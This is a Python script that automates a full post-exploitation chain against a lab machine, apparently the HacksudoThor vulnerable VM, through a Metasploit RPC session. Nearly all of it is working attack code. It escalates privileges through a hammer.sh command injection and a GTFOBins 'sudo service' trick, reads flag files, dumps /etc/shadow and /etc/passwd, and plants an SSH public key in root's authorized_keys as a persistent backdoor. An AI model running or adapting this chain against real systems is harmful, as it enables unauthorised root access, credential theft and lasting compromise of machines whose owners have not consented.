#!/usr/bin/env python3
"""
thor_full_chain.py -- Full Attack Chain Automation Script
Target: HacksudoThor
Author: Heven Tafese
Description: This script connects to an existing Metasploit RPC session
and automates the full attack chain, including privilege escalation,
post-exploitation, and the deployment of a persistent backdoor.
All output is saved to a log file on Kali.
Note: run this command 'load msgrpc Pass=abc123 Port=55552' on metasploit before excuting the python code.
"""
import time
from datetime import datetime
from pymetasploit3.msfrpc import MsfRpcClient

# ---------------------------------------------
# CONFIGURATION
# ---------------------------------------------
MSF_PASSWORD  = "abc123"
MSF_HOST      = "127.0.0.1"
MSF_PORT      = 55552
SESSION_ID    = "1"
THOR_IP       = "10.0.4.3"
KALI_IP       = "10.0.2.9"
LOG_FILE      = "/home/thor_full_chain.log"
PUBLIC_KEY    = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDF0zCDEKZBKG6NzkHUX0JPNdd7w7JxGK"
    "0I8dueohL6naKiNTZeavA8YLO6zm8CBstM1APxuncWWkt7jEezEoM6+zjy/Hn3myeatZur"
    "tldR6o09eEqIXoe6oCDf15SZF0Hbe5LjpS9t4ZktYdMIMvupNaGDebIaa9TPhfcta+u0Eu"
    "Z+wAJBmxS505nX2CM0uWC1dk7M3mch9FVTFIiWH7XFzO1ZIjIm+3N8drGXgY7C86AJW6k"
    "iNPR089W92Aoab2+gPTNV2cjURrogyPFDnVWQ/5RvYQGamwJbZ04VER7T10mTRYIti+rAh"
    "wfzIMd/AlEmtVv1uFV0ezN4Q== heven84@kali-VM"
)

# ---------------------------------------------
# LOGGING
# ---------------------------------------------
log = open(LOG_FILE, "w")

def write(msg):
    #get the current time
    timestamp = datetime.now().strftime("%H:%M:%S")
    #message format
    line = f"[{timestamp}] {msg}"
    #save it on logs and print it on the dispaly
    log.write(line + "\n")
    log.flush()
    print(line)
 #costumise the title section
def section(title):
    border = "=" * 60
    write("")
    write(border)
    write(f"  {title}")
    write(border)

#sends a command to the target
def send(session, cmd, wait=5):
    """Send a command, wait, drain and log output."""
    #send the command
    session.write(cmd + "\n")
    #wait for the command to be excuted
    time.sleep(wait)
    try:
        #try to read the output
        out = session.read()
        if out and out.strip():
            #logs the output
            write(out.strip())
        return out or ""
    #except output error
    except Exception as e:
        write(f"[read error: {e}]")
        return ""
#This cleans the output buffer(to prevent command overlap)
def drain(session, wait=3):
    """Wait and drain the buffer without logging."""
    time.sleep(wait)
    try:
        session.read()
    except Exception:
        pass
#check the user by running the whoami command
def check_user(session):
    """Return current shell user reliably."""
    session.write("whoami\n")
    time.sleep(5)
    try:
        out = session.read() or ""
        for line in out.splitlines():
            line = line.strip()
            if line in ("root", "thor", "www-data"):
                return line
    except Exception:
        pass
    return "unknown"

# ---------------------------------------------
# MAIN
# ---------------------------------------------
def main():
    write("=" * 60)
    write("  thor_full_chain.py -- Automated Attack Chain")
    write(f"  Target  : {THOR_IP}")
    write(f"  Attacker: {KALI_IP}")
    write(f"  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    write("=" * 60)

    # Connect to Metasploit RPC 
    section("CONNECTING TO METASPLOIT RPC")
    write(f"Connecting to msfrpc on {MSF_HOST}:{MSF_PORT}...")
    client = MsfRpcClient(MSF_PASSWORD, server=MSF_HOST, port=MSF_PORT, ssl=False)
    write("Connected successfully.")

    # Attach to session 
    section("ATTACHING TO SESSION")
    write(f"Attaching to Meterpreter session {SESSION_ID}...")
    session = client.sessions.session(SESSION_ID)
    write("Session attached.")

    # Drop to shell 
    write("Dropping to system shell...")
    session.write("shell\n")
    drain(session, wait=7)

    # Stabilise with PTY
    write("Spawning PTY...")
    session.write("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
    drain(session, wait=5)

    # STEP 1: Confirm www-data 
    section("STEP 1 - Confirming www-data Identity")
    user = check_user(session)
    write(f"Current user: {user}")
    send(session, "id", wait=4)

    # STEP 2: Escalate www-data -> thor via hammer.sh 
    # No drains between writes 
    #inputs must land on correct prompts sequentially
    section("STEP 2 - Executing hammer.sh Command Injection")
    write("Launching hammer.sh as thor...")
    session.write("sudo -u thor /home/thor/./hammer.sh\n")
    time.sleep(3)               
    session.write("bash -i\n")         
    time.sleep(3)               
    session.write("bash -i\n")  
    time.sleep(8)               
    drain(session, wait=2)

    # Stabilise thor shell with PTY
    session.write("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
    drain(session, wait=5)

    # STEP 3: Confirm thor 
    section("STEP 3 - Confirming Thor Shell")
    user = check_user(session)
    write(f"Current user: {user}")
    send(session, "id", wait=4)

    # STEP 4: Read root.txt as thor before escalation 
    section("STEP 4 - Reading root.txt as Thor")
    send(session, "sudo /usr/bin/cat /root/root.txt", wait=4)

    # STEP 5: Escalate thor -> root via GTFOBins 
    section("STEP 5 - Escalating to Root via GTFOBins sudo service")
    write("Running: sudo service ../../bin/bash")
    session.write("sudo service ../../bin/bash\n")
    drain(session, wait=7)

    # STEP 6: Confirm root 
    section("STEP 6 - Confirming Root Identity")
    user = check_user(session)
    write(f"Current user: {user}")
    send(session, "id", wait=4)

    # STEP 7: System Information 
    section("STEP 7 - System Information")
    send(session, "uname -a", wait=4)
    send(session, "cat /etc/os-release", wait=4)
    send(session, "ip addr show", wait=4)

    # STEP 8: Root Home Directory 
    section("STEP 8 - Enumerating Root Home Directory")
    send(session, "ls -la /root/", wait=4)

    # STEP 9: Read Proof Flag 
    section("STEP 9 - Reading Proof Flag")
    send(session, "cat /root/proof.txt", wait=4)

    # STEP 10: Extract Credentials 
    section("STEP 10 - Extracting Credentials")
    send(session, "cat /etc/shadow", wait=4)
    send(session, "cat /etc/passwd", wait=4)

    # STEP 11: SSH Backdoor 
    section("STEP 11 - Creating SSH Backdoor")
    send(session, "mkdir -p /root/.ssh && chmod 700 /root/.ssh", wait=4)
    send(session, f'echo "{PUBLIC_KEY}" >> /root/.ssh/authorized_keys', wait=4)
    send(session, "chmod 600 /root/.ssh/authorized_keys", wait=4)
    send(session, "cat /root/.ssh/authorized_keys", wait=4)
    write("SSH backdoor planted successfully.")

    # SUMMARY 
    section("SUMMARY")
    write("Full attack chain completed.")
    write(f"  www-data -> thor  : hammer.sh command injection (bash -i)")
    write(f"  thor     -> root  : GTFOBins sudo service exploit")
    write(f"  Flags    : /root/root.txt (as thor) and /root/proof.txt (as root)")
    write(f"  Creds    : /etc/shadow and /etc/passwd extracted")
    write(f"  Backdoor : SSH key planted in /root/.ssh/authorized_keys")
    write(f"  Log      : {LOG_FILE}")
    write(f"  Finished : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    log.close()
    print(f"\n[+] All output saved to {LOG_FILE}")

if __name__ == "__main__":
    main()
